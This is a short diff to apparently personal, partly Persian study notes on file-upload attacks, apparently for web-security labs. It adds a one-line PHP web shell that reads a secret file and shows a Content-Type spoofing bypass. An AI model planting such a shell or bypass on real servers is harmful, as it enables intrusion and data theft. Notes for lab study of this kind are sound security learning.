@@ -3,6 +3,9 @@
 ## Concept
 - با تغییر نام فایل آپلود شده در Burp می توانیم حملات XSS و RCE انجام دهیم
 
+## Exploitation
+- Basic PHP web shell to read a directory : ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```
+
 ## Bypass
 - Content type
   - ```application/octet-stream``` => ```Content-Type: image/jpeg```
